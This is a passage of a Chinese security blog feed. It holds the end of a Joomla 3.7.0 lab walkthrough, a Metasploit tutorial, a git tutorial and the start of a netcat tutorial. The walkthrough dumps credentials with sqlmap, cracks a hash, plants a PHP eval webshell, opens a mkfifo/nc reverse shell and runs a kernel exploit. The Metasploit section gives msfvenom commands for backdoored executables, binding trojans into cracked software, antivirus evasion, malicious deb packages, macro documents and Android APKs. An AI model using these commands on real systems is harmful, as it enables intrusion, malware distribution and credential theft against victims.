src="https://github.com/southerose/PictureBed/raw/master/img/20210413202724.png"></p><p>发现个joomla的版本为 3.7.0，直接</p><pre class="line-numbers language-none"><code class="language-none">searchsploit joomla 3.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有个sql注入的exp，使用sqlmap去跑</p><blockquote><p>爆库</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>爆表</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>爆列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://192.168.60.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>admin</td><td>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</td></tr></tbody></table><blockquote><p>先解压/usr/share/wordlists的字典文件</p></blockquote><pre class="line-numbers language-none"><code class="language-none">gzip -d rockyou.txt.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>john爆破</p><pre class="line-numbers language-none"><code class="language-none">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210413212251.png"></p><table><thead><tr><th>用户</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>snoopy</td></tr></tbody></table><p>访问我们之前扫出来的目录，<a href="http://192.168.60.136/administrator">http://192.168.60.136/administrator</a></p><p>然后找个模板去index.php进去看下，添加一行</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414211604.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414211642.png"></p><p>使用蚁剑连接</p><p>不能直接反弹shell</p><pre class="line-numbers language-none"><code class="language-none">kali:nc -lvp 4444目标：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.60.134 4444 &gt;/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>连上后看下发行版本</p><pre class="line-numbers language-none"><code class="language-none">lsb_release -auname -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210414212643.png"></p><p>直接搜索searchsploit</p><pre class="line-numbers language-none"><code class="language-none">searchsploit ubuntu 16.04 4.4.x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在kali上下载该代码</p><pre class="line-numbers language-none"><code class="language-none">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开个web服务传到靶机</p><blockquote><p>kali</p></blockquote><pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>靶机</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wget 192.168.141.134/39772.zipunzip 39772.zip &amp;&amp; cd 39772 &amp;&amp; tar -xvf exploit.tarcd ebpf_mapfd_doubleput_exploit &amp;&amp; sh compile.sh./doubleputcd /rootcat the-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> \ \      / /_<em>| | | |  _ \  ___  _ __   <em>_<em>| | | | |<br>  \ \ /\ / / _ \ | | | | | |/ _ | ‘</em> \ / _ \ | | | |<br>   \ V  V /  _<em>/ | | | |</em>| | (<em>) | | | |  _<em>/</em>|_|</em>|</em>|<br>    _/_/ ___|</em>|<em>| |___</em>/ _<strong>/|<em>| |</em>|_</strong>(<em>|</em>|<em>|</em>)</p><p>Congratulations are in order.  :-)</p><p>I hope you’ve enjoyed this challenge as I enjoyed making it.</p><p>If there are any ways that I can improve these little challenges,<br>please let me know.</p><p>As per usual, comments and complaints can be sent via Twitter to @DCAU7</p><p>Have a great day!!!!</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit教程</title>
      <link href="2021/04/11/metasploit/"/>
      <url>2021/04/11/metasploit/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：以下内容仅限于在本地测试，不可用于违法行为，参阅本博客所造成的一切后果，本人概不负责。</p></blockquote><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411182602.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411182605.png"></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><blockquote><p>常用payload</p></blockquote><pre class="line-numbers language-none"><code class="language-none">set payload windows/meterpreter/reverse_tcp  windows系统set payload linux/x64/meterpreter/reverse_tcp  linux系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>搜索模块</p></blockquote><pre class="line-numbers language-none"><code class="language-none">search {name}search type:{type}search type:{type} name:{name}search platform:{name}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>使用模块</p></blockquote><pre class="line-numbers language-none"><code class="language-none">use {module}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查看配置参数</p></blockquote><pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查看对象</p></blockquote><pre class="line-numbers language-none"><code class="language-none">show targets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>当前模块信息</p></blockquote><pre class="line-numbers language-none"><code class="language-none">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>运行模块</p></blockquote><pre class="line-numbers language-none"><code class="language-none">runexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>其他</p></blockquote><pre class="line-numbers language-none"><code class="language-none">jobs 查看后台任务jobs -K 杀死后台所有进程sessions 查看会话sessions -i {id} 切换会话到idexploit -j 保持会话到后台back 返回上一级background 后台msfdb reinit 重置数据库hosts 查看缓存services 查看所有目标开启的服务services -R {ip} 查看制定主机开启的服务hosts -d {ip} 删除数据creds 列出数据库中的所有凭据 db_export -f /root/msfbak.xml 导出数据 db_import /home/john/Documents/export.xml 导入数据将nmap中的数据导入metasploit frameworknmap -A baidu.com -oX baidu.xml 扫描结果输出到xml文件db_import /mytmp/baidu.xml 在msf中导入xml文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="基于TCP协议收集主机信息"><a href="#基于TCP协议收集主机信息" class="headerlink" title="基于TCP协议收集主机信息"></a>基于TCP协议收集主机信息</h2><blockquote><p>实验：<br>在kali上嗅探靶机的ftp登陆账户以及密码<br>首先开启两个终端，在第一个终端中运行嗅探模块（auxiliary/sniffer/psnuffle）<br>在第二终端使用lftp登陆进靶机。（lftp -u msfadmin 192.138.36.133）</p></blockquote><pre class="line-numbers language-none"><code class="language-none">db_nmap #和nmap一样search arp_sweep #msf中的辅助模块search portscan #msf中的端口扫描模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="基于SNMP协议收集主机信息"><a href="#基于SNMP协议收集主机信息" class="headerlink" title="基于SNMP协议收集主机信息"></a>基于SNMP协议收集主机信息</h2><blockquote><p>SNMP（简单网络管理协议）</p></blockquote><pre class="line-numbers language-none"><code class="language-none">search snmp_enumuse auxiliary/scanner/snmp/snmp_enum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="基于SMB协议收集信息"><a href="#基于SMB协议收集信息" class="headerlink" title="基于SMB协议收集信息"></a>基于SMB协议收集信息</h2><blockquote><p>SMB（服务器消息块），又称网络文件共享系统（CIFS）</p></blockquote><pre class="line-numbers language-none"><code class="language-none">查看smb版本search smb_versionuse auxiliary/scanner/smb/smb_version 查看目标的共享文件search smb_enumsharesuse auxiliary/scanner/smb/smb_enumshares扫描用户以及idsearch smb_lookupsiduse auxiliary/scanner/smb/smb_lookupsid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基于SSH协议收集信息"><a href="#基于SSH协议收集信息" class="headerlink" title="基于SSH协议收集信息"></a>基于SSH协议收集信息</h2><pre class="line-numbers language-none"><code class="language-none">扫描ssh信息search ssh_versionuse auxiliary/scanner/ssh/ssh_version 暴力破解ssh登录名和密码search ssh_loginuse auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="基于FTP协议收集信息"><a href="#基于FTP协议收集信息" class="headerlink" title="基于FTP协议收集信息"></a>基于FTP协议收集信息</h2><pre class="line-numbers language-none"><code class="language-none">扫描ftp服务search ftp_versionuse auxiliary/scanner/ftp/ftp_version扫描出来的结果是：vsFTPd 2.3.4\搜索与vsFTPd 2.3.4相关的漏洞search VSFTPD v2.3.4use exploit/unix/ftp/vsftpd_234_backdoor扫描ftp是否可以匿名登陆search name:anonymoususe auxiliary/scanner/ftp/anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="制作winddows恶意软件来获取shell"><a href="#制作winddows恶意软件来获取shell" class="headerlink" title="制作winddows恶意软件来获取shell"></a>制作winddows恶意软件来获取shell</h2><blockquote><p>生成.exe 后门程序</p></blockquote><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' lhost=192.168.36.128 lport=6667 -f exe &gt; rose4.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使用一个编码器</p></blockquote><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6666 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/rose1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使用两个编码器组合编码</p></blockquote><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6666 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/rose2.exe打开msf，启动后门监听模块use exploit/multi/handler查看meterpreter的所以命令    help实时监控屏幕 run vnc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="在正常软件中植入木马"><a href="#在正常软件中植入木马" class="headerlink" title="在正常软件中植入木马"></a>在正常软件中植入木马</h2><pre class="line-numbers language-none"><code class="language-none">例如：windows激活工具，私服客户端，盗版游戏，彩票，抢红包软件，PS激活工具，CRT激活工具，注册机。。。tips: 先查看主程序会调用哪些附加的小程序，然后把payload后门和这些小程序绑定到一起。当然也可以直接加到主程序上，但是加主程序上，有时报错。-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b"\x00" -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用模块生成反杀毒软件的木马"><a href="#使用模块生成反杀毒软件的木马" class="headerlink" title="使用模块生成反杀毒软件的木马"></a>使用模块生成反杀毒软件的木马</h2><pre class="line-numbers language-none"><code class="language-none">search evasionuse evasion/windows/windows_defender_exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="制作-Linux-恶意软件获取-shell"><a href="#制作-Linux-恶意软件获取-shell" class="headerlink" title="制作 Linux 恶意软件获取 shell"></a>制作 Linux 恶意软件获取 shell</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b "\x00" -i 10 -f elf -o /var/www/html/souther打开msf，启动后门监听模块use exploit/multi/handler设置payload后门set linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="制作恶意deb软件包来触发后门"><a href="#制作恶意deb软件包来触发后门" class="headerlink" title="制作恶意deb软件包来触发后门"></a>制作恶意deb软件包来触发后门</h2><pre class="line-numbers language-none"><code class="language-none">apt --download-only install freesweep      #仅下载 dpkg -x {name} {目录}      #解压文件生成后门msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.1.128 LPORT=6667 -b "\x00" -i 10 -f elf -o /mytmp/free/usr/games/freesweep_sources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用0DAY漏洞获取shell"><a href="#利用0DAY漏洞获取shell" class="headerlink" title="利用0DAY漏洞获取shell"></a>利用0DAY漏洞获取shell</h2><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.gitpython CVE-2018-8174.py -u http://192.168.36.128/exploit.html -o hack.rtf -i 192.168.36.128 -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="基于java-环境的漏洞利用获取shell"><a href="#基于java-环境的漏洞利用获取shell" class="headerlink" title="基于java 环境的漏洞利用获取shell"></a>基于java 环境的漏洞利用获取shell</h2><pre class="line-numbers language-none"><code class="language-none">第一步我们先安装 java 环境上传 jre 到 win7 或 xp 操作系统useexploit/multi/browser/java_jre17_driver_managershow optionsshow payloads #查看此 java模块可以使用的 payloadsmsf5 exploit(multi/browser/java_jre17_driver_manager) &gt;msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; set LHOST 192.168.1.53msf5 exploit(multi/browser/java_jre17_driver_manager) &gt; jobs -Kmsf5 exploit(multi/browser/java_jre17_driver_manager) &gt; exploit在 win7 上安装 java 环境win7 主机访问 http://192.168.1.53:8080/bUry5GxBnxluT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用宏感染-word-文档获取-shell"><a href="#利用宏感染-word-文档获取-shell" class="headerlink" title="利用宏感染 word 文档获取 shell"></a>利用宏感染 word 文档获取 shell</h2><pre class="line-numbers language-none"><code class="language-none">首先将 cn_office_professional_plus_2007_dvd_X12-38713.rar 上传到 win7 虚拟上，解压后，安装一下 office。office 的激活码: DBXYD-TF477-46YM4-W74MH-6YDQ8msfvenom -a x86 --platform windows -pwindows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exemsf5 exploit(multi/browser/java_jre17_driver_manager) &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.53msf5 exploit(multi/handler) &gt; jobs -Kmsf5 exploit(multi/handler) &gt; exploit2、配置好侦听之后我们打开我们制作的 word 文档，文档一旦打开就会执行 payload 连接到 MSF，关闭 word 文档之后 session 不受影响。允许运行宏：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安卓客户端渗透"><a href="#安卓客户端渗透" class="headerlink" title="安卓客户端渗透"></a>安卓客户端渗透</h2><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.36.128 LPORT=4444 R &gt; rose.apkmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set PAYLOAD android/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.1.53msf5 exploit(multi/handler) &gt; set lport 4444msf5 exploit(multi/handler) &gt; run手机端点击打开 APK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git+bash教程</title>
      <link href="2021/04/11/git/"/>
      <url>2021/04/11/git/</url>
      
        <content type="html"><![CDATA[<p>个人学习笔记记录有限，若完整学习，请移步码云官方==Git大全==！</p><h1 id="Git完整内容学习"><a href="#Git完整内容学习" class="headerlink" title="Git完整内容学习"></a>Git完整内容学习</h1><blockquote><p><a href="https://gitee.com/all-about-git">码云Git大全</a></p></blockquote><h1 id="常见的版本控制工具"><a href="#常见的版本控制工具" class="headerlink" title="常见的版本控制工具"></a>常见的版本控制工具</h1><p>Git</p><p>SVN</p><p>CVS</p><p>VSS</p><p>TFS</p><h1 id="版本控制分类"><a href="#版本控制分类" class="headerlink" title="版本控制分类"></a>版本控制分类</h1><p><strong>1.本地版本控制</strong> </p><p><strong>2.集中式版本控制 SVN</strong></p><p>所有的版本数据都在服务器上 ，必须联网</p><p><strong>3.分布式版本控制系统 Git</strong></p><p>每个人都拥有全部的代码，在本地就能看到版本数据</p><p>不会因为服务器损坏，造成不能工作的情况</p><h1 id="Git和SVN的主要区别"><a href="#Git和SVN的主要区别" class="headerlink" title="Git和SVN的主要区别"></a>Git和SVN的主要区别</h1><p><strong>SVN集中版本控制系统</strong></p><p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，对网络带宽要求较高。</p><p><strong>Git分布式版本控制系统</strong></p><p>Git是分布式版本控制系统，没有中央服务器，每个人的电脑就是一个完整的版本库，工作的时候不需要联网了，因为版本都在自己电脑上。协同的方法是这样的∶比如说自己在电脑上改了文件A，樊他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git可以直接看到更新了哪些代码和文件!</p><p><strong>Git是目前世界上最先进的分布式版本控制系统。</strong></p><p>官网下载慢，采用镜像下载</p><p><strong><a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a></strong></p><h1 id="bash基础命令"><a href="#bash基础命令" class="headerlink" title="bash基础命令"></a>bash基础命令</h1><p><strong>mkdir 创建目录/文件夹</strong></p><p><strong>rm -r 删除文件夹</strong></p><p><strong>touch 创建文件</strong></p><p><strong>rm 删除文件</strong></p><p><strong>pwd 显示当前所在目录路径</strong></p><p><strong>history 查看历史命令</strong></p><p>help 查看帮助</p><p>exit 退出</p><p>‘’#’’ 注释</p><h1 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h1><blockquote><p><strong>所有的配置文件其实都保存在本地</strong></p><p><strong>[1] Git\etc\gitconfig   Git安装目录下的gitconfig   –system系统级</strong></p><p><strong>[2] C:\Users\Administrator.gitconfig   只适用于当前登录的用户配置   –globle 全局</strong></p></blockquote><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">git config -l #查看配置列表git config --system --list #查看系统配置列表git config --global --list #查看全局配置!必须配置git config --global user.name "southerose" #全局配置用户名git config --global user.email "1374900749@qq.com" #全局配置邮箱<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="git环境配置"><a href="#git环境配置" class="headerlink" title="git环境配置"></a>git环境配置</h1><pre class="line-numbers language-py" data-language="py"><code class="language-py">git config --global user.name "southerose" #全局配置用户名git config --global user.email "1374900749@qq.com" #全局配置邮箱<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="git基本理论（核心）"><a href="#git基本理论（核心）" class="headerlink" title="git基本理论（核心）"></a>git基本理论（核心）</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20201020211550366.png"></p><p>Workspace：<strong>工作区</strong>，平时存放代码的地方。</p><p>Index/Stage：<strong>暂存区</strong>，用于临时存放你的改动，事实上他只是一个文件，保存即将提交到文件列表的信息。</p><p>Repository：<strong>仓库区</strong>（或本地仓库），就是安全存放数据的位置，这里面有你提交到所有版本的数据，其中HEAD指向最新放入仓库的版本。</p><p>Remote：<strong>远程仓库</strong>，托管代码的服务器，可以简单的认为是你项目组中的一台电脑用于远程数据交换。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20201020213452490.png"></p><h1 id="git项目的搭建"><a href="#git项目的搭建" class="headerlink" title="git项目的搭建"></a>git项目的搭建</h1><p><strong>本地仓库搭建</strong></p><p>方式：1.创建全新的仓库</p><p>​            2.克隆远程仓库</p><p>[1] 创建全新的仓库，需要用到GIT管理的项目的根目录执行：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 在当前目录创建一个Git代码库$ git init# 从远程克隆到本地仓库$ git clone [url]# 添加所有文件到暂存区stages$ git add .# 提交暂存区的内容到本地仓库repository -m提交信息$git commit -m "content"//m:message# 推动到remote$git push#查看制定文件状态$ git status [filename]# 查看所有文件状态$ git status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[2] 执行后可以看到，仅仅在项目目录多出了一个.git目录，关于版本等的所有信息都在这个目录里面。</p><h1 id="git文件操作"><a href="#git文件操作" class="headerlink" title="git文件操作"></a>git文件操作</h1><blockquote><p>文件的四种状态</p></blockquote><p>Untracked：<strong>未跟踪</strong>，此文件在文件夹中，,但并没有加入到git库,不参与版本控制.通过==git add==状态变为==staged==</p><p>Unmodify：<strong>文件已经入库</strong>,未修改，即版本库中的文件快照内容与文件夹中完全一致.这种类型的文件有两种去处,如果它被修改,而变为==Modified== .如果使用==git rm==移出版本库,则成为==Untracked==文件</p><p>Modified:<strong>文件已修改</strong>，仅仅是修改，并没有进行其他的操作.这个文件也有两个去处,，通过==git add==可进入暂存==staged==状态，使用==git checkout==则丢弃修改过，返回到==unmodify==状态，这个 ==git checkout==即从库中取出文件，覆盖当前修改!</p><p>Staged:<strong>暂存状态</strong>,执行==git commit==则将修改同步到库中,这时库中的文件和本地文件又变为一致，文件为==Unmodify==状态.执行==git reset HEAD filename==取消暂存,文件状态为==Modified==</p><h1 id="git忽略文件"><a href="#git忽略文件" class="headerlink" title="git忽略文件"></a>git忽略文件</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 注释</span><span class="token operator">*</span><span class="token punctuation">.</span>txt 忽略所有以<span class="token punctuation">.</span>txt结尾的文件！lib<span class="token punctuation">.</span>txt <span class="token comment">#lib.txt除外</span><span class="token operator">/</span>temp <span class="token comment">#仅忽略项目根目录下的TODO目录，不包括其他目录temp</span>build<span class="token operator">/</span> <span class="token comment">#忽略build/目录下的所有文件</span>doc<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>txt <span class="token comment">#忽略doc/notes.txt 但不包括 doc/server/arch.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用码云"><a href="#使用码云" class="headerlink" title="使用码云"></a>使用码云</h1><p>1.注册账号，并且完善个人信息（不能乱填）</p><p>2.设置本机ssh公钥，实现免密码登陆</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 进入 c:\Users\Administrator\.ssh</span><span class="token comment"># 生成公钥</span>$ ssh<span class="token operator">-</span>keygen<span class="token comment"># 生成公钥并且使用rsa加密</span>$ ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.将公钥信息public key 添加到码云账户即可</p><p>4.使用码云创建一个自己的仓库</p><h1 id="将本地项目部署到远程仓库"><a href="#将本地项目部署到远程仓库" class="headerlink" title="将本地项目部署到远程仓库"></a>将本地项目部署到远程仓库</h1><blockquote><p>1.创建一个远程仓库</p><p>2.创建一个项目</p><p>3.将远程仓库clone到本地</p><p>4.将远程仓库的文件内容复制到本地项目文件里面</p><p>5.在项目里面依次</p><p>git add .</p><p>git commit -m “demo”</p><p>git push</p></blockquote><h1 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h1><pre class="line-numbers language-none"><code class="language-none"># 查看本地分支$ git branch# 查看远程分支$ git branch -r# 创建一个新分支$ git branch [branch-name]# 创建一个分支，并切换该分支$ git checkout -b [branch]# 切换到指定分支$ git checkout [branch]# 合并指定分支到当前分支$ git merge [branch]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin [branch-name]$ git branch -dr [remote/branch]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcat教程</title>
      <link href="2021/04/11/netcat/"/>
      <url>2021/04/11/netcat/</url>
      
        <content type="html"><![CDATA[<h1 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h1><pre class="line-numbers language-none"><code class="language-none"># 查看命令参数nc -h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><table><thead><tr><th>命令参数</th><th>描述</th></tr></thead><tbody><tr><td>-d</td><td>在后台运行</td></tr><tr><td>-e</td><td>执行某个程序，例如 -e /bin/bash</td></tr><tr><td>-G gateway</td><td>设置网关，常用于突破内网限制</td></tr><tr><td>-g num</td><td>路由跳数</td></tr><tr><td>-i sec</td><td>设置发送一行数据的时间间隔</td></tr><tr><td>-l</td><td>设置nc处于listen状态等待连接</td></tr><tr><td>-L</td><td>设置nc处于listen状态，当客户端断开，服务端任然回到listen状态</td></tr><tr><td>-n</td><td>设置nc只识别ip地址，不进行dns解析</td></tr><tr><td>-o file</td><td>设置传输十六进制的数据</td></tr><tr><td>-p port</td><td>设置本地监听的端口号</td></tr><tr><td>-r</td><td>设置netcat随机化的端口号</td></tr><tr><td>-s addr</td><td>设置netcat源地址</td></tr><tr><td>-t</td><td>回复telnet的请求数据包</td></tr><tr><td>-u</td><td>设置netcat使用UDP模式</td></tr><tr><td>-v</td><td>显示错误提示信息</td></tr><tr><td>-w secs</td><td>设置连接超时秒数</td></tr><tr><td>-z</td><td>设置扫描模式，表示发送的数据包不包含任何的payload</td></tr><tr><td>[start_port-stop_port]</td><td>端口范围</td></tr></tbody></table><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411124232.png"></p><h1 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h1><ul><li>服务端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -l -p [localport]#监听本地端口4444nc -l -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc [remote_addr] [remoteport]#连接服务端192.168.1.1的4444端口nc 192.168.1.1 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是这里只是简单的建立了一个通信系统，还不能执行远程命令</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><blockquote><p>目标已安装netcat</p></blockquote><ul><li>服务端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -l -p [localport] -e [shell_type]nc -l -p 4444 -e /bin/bash##监听本地端口4444，连接时反弹shell<span aria-hidden="true" 